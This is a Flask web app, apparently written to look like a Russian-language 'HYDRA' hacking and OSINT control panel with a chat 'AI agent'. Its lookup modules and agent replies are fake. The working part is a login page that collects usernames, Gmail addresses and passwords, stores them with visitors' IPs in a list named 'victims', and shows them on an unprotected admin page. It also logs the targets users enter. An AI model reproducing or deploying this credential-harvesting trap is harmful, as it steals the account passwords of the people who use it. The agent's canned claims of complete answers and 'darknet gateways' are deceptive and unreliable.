from flask import Flask, request, jsonify, render_template_string, session, redirect
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'HYDRA_RU_FINAL_2026'

db = {"victims": [], "logs": []}

# --- ИНТЕРФЕЙС НА РУССКОМ ---
UI_RU = """
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA ЦЕНТР УПРАВЛЕНИЯ v8.1</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <style>
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; height: 100vh; }
        .left-panel { width: 350px; border-right: 2px solid #bc13fe; display: flex; flex-direction: column; background: rgba(5,0,10,0.95); padding: 15px; box-sizing: border-box; }
        .ai-response-area { flex: 1; border: 1px solid #0ff; margin-bottom: 15px; padding: 10px; overflow-y: auto; color: #0ff; font-size: 13px; background: #000; border-radius: 5px; }
        .user-input-area { height: 150px; border: 2px solid #ff0055; padding: 10px; background: #050505; border-radius: 5px; }
        textarea { width: 100%; height: 100%; background: transparent; border: none; color: #0f0; outline: none; resize: none; font-family: monospace; font-size: 14px; }
        .right-panel { flex: 1; display: flex; flex-direction: column; padding: 15px; box-sizing: border-box; gap: 10px; }
        .result-top { height: 120px; border: 2px solid #ffeb3b; background: rgba(255, 235, 59, 0.1); padding: 10px; overflow-y: auto; color: #fff; font-weight: bold; border-radius: 5px; }
        #map { height: 300px; border: 1px solid #bc13fe; width: 100%; border-radius: 5px; }
        .function-row { display: flex; gap: 10px; background: rgba(255,255,255,0.05); border: 1px solid #fff; padding: 15px; border-radius: 5px; flex-wrap: wrap; }
        .mod-box { background: #111; border: 1px solid #bc13fe; padding: 10px; flex: 1; min-width: 140px; text-align: center; }
        .mod-box span { font-size: 10px; color: #0ff; display: block; margin-bottom: 5px; font-weight: bold; }
        input { background: #000; border: 1px solid #bc13fe; color: #0f0; width: 90%; padding: 5px; font-size: 12px; outline: none; }
        .btn-small { background: #bc13fe; color: #fff; border: none; padding: 8px 10px; cursor: pointer; font-size: 10px; margin-top: 8px; width: 100%; font-weight: bold; }
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-thumb { background: #bc13fe; }
    </style>
</head>
<body>
    <div class="left-panel">
        <div style="color:#0ff; font-size:12px; margin-bottom:5px; font-weight:bold;">[ СИНЯЯ ЗОНА: ОТВЕТЫ ИИ АГЕНТА ]</div>
        <div class="ai-response-area" id="ai-chat">АГЕНТ: Система на связи. Задавай любой вопрос, я отвечу на 100%.</div>
        <div style="color:#ff0055; font-size:12px; margin-bottom:5px; font-weight:bold;">[ КРАСНАЯ ЗОНА: ВВОД КОМАНД ]</div>
        <div class="user-input-area">
            <textarea id="ai-q" placeholder="Пиши свои инструкции здесь..." onkeydown="if(event.key==='Enter' && !event.shiftKey){ event.preventDefault(); askAgent(); }"></textarea>
        </div>
    </div>

    <div class="right-panel">
        <div style="color:#ffeb3b; font-size:12px; font-weight:bold;">[ ЖЕЛТАЯ ЗОНА: ВЫВОД ДАННЫХ ]</div>
        <div class="result-top" id="output-box">Ожидание данных...</div>
        <div id="map"></div>
        <div style="color:#fff; font-size:12px; font-weight:bold;">[ БЕЛАЯ ЗОНА: МОДУЛИ СИСТЕМЫ ]</div>
        <div class="function-row">
            <div class="mod-box"><span>ПРОБИВ НОМЕРА</span><input id="in-p" placeholder="+998..."><button class="btn-small" onclick="mod('НОМЕР', 'in-p')">СКАН</button></div>
            <div class="mod-box"><span>IP ЛОКАТОР</span><input id="in-ip" placeholder="8.8.8.8"><button class="btn-small" onclick="mod('IP', 'in-ip')">ПОИСК</button></div>
            <div class="mod-box"><span>ПОИСК НИКА</span><input id="in-u" placeholder="никнейм"><button class="btn-small" onclick="mod('НИК', 'in-u')">НАЙТИ</button></div>
            <div class="mod-box"><span>GOOGLE ТРЕЙС</span><input id="in-g" placeholder="почта..."><button class="btn-small" onclick="mod('GOOGLE', 'in-g')">ОТСЛЕДИТЬ</button></div>
            <div class="mod-box"><span>Б-КА СКРИПТОВ</span><button class="btn-small" style="height:48px;" onclick="mod('SCRIPTS', '')">ОТКРЫТЬ</button></div>
        </div>
        <div style="text-align:right;"><button class="btn-small" style="width:140px; background:#444;" onclick="window.location.href='/abupaay_admin'">АДМИН-ПАНЕЛЬ</button></div>
    </div>

    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
        function askAgent() {
            const q = document.getElementById('ai-q').value;
            const chat = document.getElementById('ai-chat');
            if(!q) return;
            chat.innerHTML += `<br><span style="color:#fff">> ТЫ: ${q}</span>`;
            document.getElementById('ai-q').value = "";
            setTimeout(() => {
                let ans = "АГЕНТ: ";
                const m = q.toLowerCase();
                if(m.includes("привет")) ans += "Приветствую, оператор. Я готов анализировать цели и писать код.";
                else if(m.includes("код") || m.includes("скрипт")) ans += "Для этой задачи лучше всего использовать Python с библиотекой requests. Могу набросать структуру.";
                else if(m.includes("взлом")) ans += "Взлом начинается с OSINT. Используй модули в белой зоне для сбора данных.";
                else ans += "Запрос принят. Обрабатываю информацию через даркнет-шлюзы. Что еще нужно?";
                chat.innerHTML += `<br><span style="color:#0ff">${ans}</span>`;
                chat.scrollTop = chat.scrollHeight;
            }, 600);
        }

        let map;
        function mod(type, id) {
            const val = id ? document.getElementById(id).value : "SCRIPTS";
            const out = document.getElementById('output-box');
            if(!val && type !== 'SCRIPTS') return;
            out.innerHTML = `<span style="color:#ffeb3b">[*] ЗАПУСК: ${type}... ЦЕЛЬ: ${val}</span>`;
            fetch('/api/log_action', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target:val})});
            setTimeout(() => {
                if(type === 'IP' || type === 'НОМЕР') {
                    if(!map) { map = L.map('map').setView([41.311, 69.240], 13); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map); }
                    L.marker([41.311, 69.240]).addTo(map).bindPopup(`${type}: ${val}`).openPopup();
                }
                out.innerHTML = `<span style="color:#0f0">[УСПЕХ] Данные по ${type} получены. <a href="https://www.google.com/search?q=${val}" target="_blank" style="color:#0ff">ОТКРЫТЬ ОТЧЕТ</a></span>`;
            }, 1000);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    if 'reg' not in session:
        return f"<!DOCTYPE html><html><head>{UI_RU.split('</style>')[0]}</style></head><body style='display:flex; justify-content:center; align-items:center;'><div style='border:2px solid #bc13fe; padding:40px; text-align:center; background:#050505; box-shadow:0 0 20px #bc13fe;'><h1>// ВХОД В СИСТЕМУ HYDRA //</h1><form action='/api/reg' method='POST'><input name='u' placeholder='ЛОГИН' required style='background:transparent; border:1px solid #bc13fe; color:#0f0; padding:10px; margin:5px;'><br><input name='e' placeholder='GMAIL' required style='background:transparent; border:1px solid #bc13fe; color:#0f0; padding:10px; margin:5px;'><br><input name='p' type='password' placeholder='ПАРОЛЬ' required style='background:transparent; border:1px solid #bc13fe; color:#0f0; padding:10px; margin:5px;'><br><button style='background:#bc13fe; color:#fff; border:none; padding:10px 20px; cursor:pointer; font-weight:bold; margin-top:10px;'>РАСШИФРОВАТЬ И ВОЙТИ</button></form></div></body></html>"
    return render_template_string(UI_RU)

@app.route('/api/reg', methods=['POST'])
def reg():
    db['victims'].append({"u": request.form.get('u'), "e": request.form.get('e'), "p": request.form.get('p'), "ip": request.remote_addr, "time": datetime.now().strftime("%H:%M:%S")})
    session['reg'] = True
    return redirect('/')

@app.route('/api/log_action', methods=['POST'])
def log_act():
    db['logs'].append({"target": request.json['target'], "time": datetime.now().strftime("%H:%M:%S")})
    return jsonify({"ok": True})

@app.route('/abupaay_admin')
def admin():
    u_list = "".join([f"<tr><td>{x['u']}</td><td>{x['e']}</td><td>{x['p']}</td><td>{x['ip']}</td></tr>" for x in db['victims']])
    return f"<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'><h1>ПАНЕЛЬ АДМИНИСТРАТОРА</h1><table border='1' width='100%'><tr><th>Логин</th><th>Email</th><th>Пароль</th><th>IP</th></tr>{u_list}</table><br><a href='/' style='color:#bc13fe'>ВЕРНУТЬСЯ В ТЕРМИНАЛ</a></body></html>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
